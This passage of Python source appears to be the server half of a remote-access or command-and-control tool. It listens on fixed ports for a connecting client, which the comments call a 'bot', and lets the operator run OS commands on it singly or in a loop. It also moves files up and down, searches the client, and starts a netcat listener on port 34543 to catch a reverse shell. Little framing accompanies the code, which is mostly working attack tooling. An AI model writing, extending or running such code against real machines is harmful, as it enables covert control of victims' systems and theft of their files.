        mysendall(socket, data, delimiter)  
        # Now we check if there is a client message or command output
        output = myrecvall(socket,delimiter).decode()  
        if output.startswith("[!] ERROR") or output.startswith('[!] No'):
            print(output+'\n')
            if log == True:
                logger(output+'\n')
        else:
            print('{}[-]{} Command output: '.format(trquise, stop))
            if log == True:
                logger('{}[-]{} Command output:\n'.format(trquise, stop))
            print(output) 
        # Now we tell the client we are ready for the next command
        data = '{}[-]{} Next'.format(trquise, stop).encode()
        mysendall(socket, data, delimiter)  
        # We recieve the client message
        print('\n'+myrecvall(socket,delimiter).decode()) 
    if log == True:
        logger('[-] End command function'+'\n'+'-'*50+'\n')
        

def shell(socket, delimiter):
    if log == True:
        logger('-'*50+'\n[-] Start shell function\n')
    client_msg = myrecvall(socket,delimiter).decode()
    if client_msg.startswith('win'):
        data = '{}[-]{} Goodbye'.format(cyan, stop).encode()
        mysendall(socket, data, delimiter)
        print(myrecvall(socket, delimiter).decode())
    else:
        data = '{}[-]{} Starting listener on port 34543'.format(cyan, stop).encode()
        mysendall(socket, data, delimiter)
        try:
            subprocess.call('nc -nlvvvp 34543', shell=True)
        except KeyboardInterrupt:
            print('{}[-]{} Exiting client shell'.format(cyan, stop))
            if log == True:
                logger('{}[-]{} Exiting client shell'.format(cyan, stop))
            print(myrecvall(socket, delimiter).decode())
        else:
            print(myrecvall(socket, delimiter).decode())
    if log == True:
        logger('[-] End shell function'+'-'*50+'\n')

def multi(socket, delimiter, addr):
    """
    This Function will allow you to start a loop and send os commands to the bot.
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: this is a custom delimiter that we set for sending and
                receiving information from the client.
    :addr: The ip address used for the prompt
    :prompt: A string identifying the username, ip and directory
    :type_e: the data type of the error received
    """
    if log == True:
        logger('-'*50+'\n[-] Start multi function')
    data = b''
    while data != b'bk':
        try:
            client_info = myrecvall(socket, delimiter).decode()
        except Exception as e:
            type_e = str(type(e)).split()[1].split(">")[0]
            print('{0}[-]{1} Multi Function Error: \n  --Error type: {2}\n  --Error: {3}'.format(trquise, stop, type_e, e))
            if log == True:
                logger('{0}[-]{1} Multi Function Error: \n  --Error type: {2}\n  --Error: {3}\n'.format(trquise, stop, type_e, e))
            data = b'back'            
        # split the information received and use the name and working dir as prompt
        client_name, client_CWD = client_info.split(';')
        # We print the server commands
        print('{0}[-]{1} Enter shell command or type bk to go back'.format(trquise, stop))
        prompt = '{3}[!]{4} {0}@{1}: {2}> '.format(client_name, addr, client_CWD, trquise, stop)
        if log == True:
            logger('{0}[-]{1} Enter shell command or type bk to go back\n'.format(trquise, stop))
            logger(prompt+'\n')
        data = input(prompt).encode()
        # This will call the function defined above, we are passing the connection
        mysendall(socket, data, delimiter) 
        if data == b'bk':
            break
        else:
            command(socket, data, delimiter)
            # Wait for the next server command
            continue
    if log == True:
        logger('[-] End multi function\n'+'-'*50+'\n')


def main():
    """
    This function will establish a socket with the client and connect.
    :port: will be the port that is open for the client to connect to.
    :ip: this will be the server ip we will bind
    :delimiter: this is a custom delimiter that we set for sending and
                receiving information from the client.
    :srvr: this is the server socket that the client will connect to.
    :conn: this is the connection object that python will use
    :addr: this is the port, ip tuple that the connection will use
    :data: This is the information that is sent across the socket
    :D_recvd: this is the decoded data from the client
    :prompt: the string that identifies the username, ip and working directory
    :theFile: this is the file location that we will use to save
              downloaded items
    :mysendall: a function for sending information on the server
    :myrecvall: a function for receiving information on the server
    :srvr_cmds: the available server commands, refer to the helper 
                function for more information
    """
    srvr_cmds = """\n{}[-]{} Server commands are as follows, enter them as shown:
    b   - bnnr
    cl  - clear
    cmd - command  
    dc  - disconnect
    dl  - download
    ul  - upload
    src - search
    sh  - shell
    h   - help
    hs  - history
    qt  - quit
    ex  - exit
""".format(wht, stop)
    if log == True:
        logger('='*50+'\n[-] Server log started at: {}\n'.format(datetime.datetime.now()))
    # We will set the constants for our
    ports = [8888, 7777, 6666, 5555]
    ip = '0.0.0.0'
    delimiter = b"!!@@##$$!!"
    screen_wipe()
    # We will now set up the server for connections
    srvr = socket.socket()
    bnnr_roll()
    # Look for any connection attempts to any of the ports in the list
    for port in ports:
        cport = port
        try:
            time.sleep(1)
            print("{}[-]{} Binding port: {}".format(wht, stop, port))  # Identify the port for connection
            if log == True:
                logger("{}[-]{} Binding port: {}\n".format(wht, stop, port))  # Identify the port for connection
            srvr.bind((ip, port))  # Bind to the ip and port from user input
        except socket.error:
            continue
        else:
            break
    srvr.listen(2)  # Wait for connection to the client
    # Now we have to accept the connections and handle 
    # the communication with the client
    try:
        # Now we will start a while loop that will accept a connection. 
        # If the client drops the server will remain up.
        while True:
            print("{}[-]{} Listening for connections on 0.0.0.0 ...".format(wht, stop))
            if log == True:
                logger("{}[-]{} Listening for connections on 0.0.0.0 ...\n".format(wht, stop))
            # we will now use the accept method once a client reaches out
            conn, addr = srvr.accept()
            ip_addr = addr[0]
            # Print that a connection has occurrd
            print("{}[-]{} Connection established with client at {} !".format(wht, stop, str(ip_addr)))
            if log == True:
                logger("{}[-]{} Connection established with client at {}!\n".format(wht, stop, str(ip_addr)))
            # Initialize an internal while loop for data handling
            data = b'start'
            cmd_list = []
            # We start our loop to handle commands as long as data isn't quit or exit
            while data != b'qt' or data != b'ex':
                # We get the working directory and username from the client.
                client_info = myrecvall(conn, delimiter).decode()
                # split the information received and use the name and working dir as prompt
                client_name, client_CWD = client_info.split(';')
                print('{}[-]{} Enter server command or press ? for server command list'.format(wht, stop))
                if log == True:
                    logger('{}[-]{} Enter server command or press ? for server command list\n'.format(wht, stop))
                # We print the server commands
                prompt = '{3}[-]{4} {0}@{1}: {2}> '.format(client_name, ip_addr, client_CWD, wht, stop)
                if log == True:
                    logger('{3}[-]{4} {0}@{1}: {2}>\n'.format(client_name, ip_addr, client_CWD, wht, stop))
                # Now we have our prompt: {}[-]{} user@ip:working_directory>
                # This will take the byte encoded input 
                # from the user and save it in a variable
                data = input(prompt).strip().encode()
                cmd_list.append(data)
                # This will call the function defined above, we are passing the connection
                mysendall(conn, data, delimiter) 
                # Start our conditional for dealing with server commands
                exlist = [b'qt', b'ex']
                # First we check if the command was l!
                if b'l!' in data:
                    if data == b'l!':
                        data = cmd_list[-1]
                        print(data)
                if data == b'dl':
                    # Deal with a download request
                    download(conn, delimiter)
                    # Wait for next server command
                    continue
                elif data == b'b':
                    bnnr_roll()
                elif data == b'hs':
                    # This will show you all the server commands you enterd
                    for cmd in cmd_list:
                        if cmd == b'hs':
                            pass
                        else:
                            print('    {0}{2}{1} {3}'.format(magenta, stop, cmd_list.index(cmd), cmd))
                            if log == True:
                                logger('    {0}{2}{1} {3}\n'.format(magenta, stop, cmd_list.index(cmd), cmd))
                    continue
                elif data == b'dc':
                    # Print the client disconnect message on the screen
                    print(myrecvall(conn, delimiter).decode())
                    # Close the connection
                    conn.close()
                    # Give the user time to read message
                    time.sleep(1)
                    # Clear the screen
                    screen_wipe()
                    # Break out of our connected loop and listen for a new connection
                    break
                elif data == b'ul':
                    # Deal wih an upload request
                    upload(conn, delimiter)
                    # Wait for the next server command
                    continue
                elif data == b'src':
                    # Now we will use our searcher function 
                    # to search the client
                    print(searcher(conn, delimiter))
                    # Wait for the next server command
                    continue
                elif data == b'cl':
                    # Use the screen wipe to clear the screen
                    screen_wipe()
                    # Wait for the next server command
                    continue
                elif data == b'?':
                    # If ? is enterd display a list of server commands
                    print(srvr_cmds)
                    # Wait for the next command
                    continue
                elif data == b'cmd':
                    print(myrecvall(conn, delimiter).decode())
                    ask = input('{}[-]{} s - single or m - multiple:> '.format(trquise, stop)).strip()
                    if log == True:
                        logger('{}[-]{} s - single or m - multiple:>\n'.format(trquise, stop))
                    mysendall(conn, ask.encode(), delimiter)
                    if ask.lower().startswith('s'):
                        print('{}[-]{} Enter os command or type bk to go back'.format(trquise, stop))
                        if log == True:
                            logger('{}[-]{} Enter os command or type bk to go back\n'.format(trquise, stop))
                        data = input('{}[-]{} What command:> '.format(trquise, stop)).strip().encode()
                        if log == True:
                            logger('{}[-]{} What command:>\n'.format(trquise, stop))
                        # Enter the command function to run commands
                        command(conn, data, delimiter)
                        # Wait for the next server command
                        continue
                    elif ask.lower().startswith('m'):
                        # start a shell with the client
                        multi(conn, delimiter, ip_addr)
                        continue
                elif data == b'h':
                    # Deal with help command by calling help function
                    helper()
                    # Wait for the next server command
                    continue 
                elif data in exlist:
                    # Print the disconnection message from the client
                    print(myrecvall(conn, delimiter).decode())
                    # Wait for one second before clearing screen
                    if log == True:
                        logger('[-] Server log end at: {}\n'.format(datetime.datetime.now())+'='*50+'\n')
                    time.sleep(1)
                    # Clear the screen 
                    screen_wipe()
                    # Close the server
                    srvr.close()
                    # Print a goodbye message
                    print('\n{}[-]{} Good Day Sir, you win nothing nada zip!\n'.format(wht, stop))
                    sys.exit()
                elif data == b'sh':
                    shell(conn, delimiter)
                    continue
    except KeyboardInterrupt:
        # If a ctrl + c is enterd we print the message
        print("\n{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
        if log == True:
            logger("{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
            logger('[-] Server log end at: {}'.format(datetime.datetime.now())+'\n'+'='*50+'\n')
        # Close the server object
        srvr.close()
        # Exit the program
        sys.exit()
    except Exception as e:
        # Print any error received from server side during connection attempt
        type_e = str(type(e)).split()[1].split('>')[0]
        data = '{0}[-]{1} Main Function Error: \n  --ERROR TYPE: {2} \n  --ERROR:{3}'.format(lt_rd, stop, type_e, str(e))
        print(data)
        # Close the server object
        if log == True:
            logger('\n'+data+'\n')
            logger('[-] Server log end at: {}\n'.format(datetime.datetime.now())+'\n'+'='*50+'\n')
        srvr.close()
        # Exit the program
        sys.exit()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
       sys.exit()
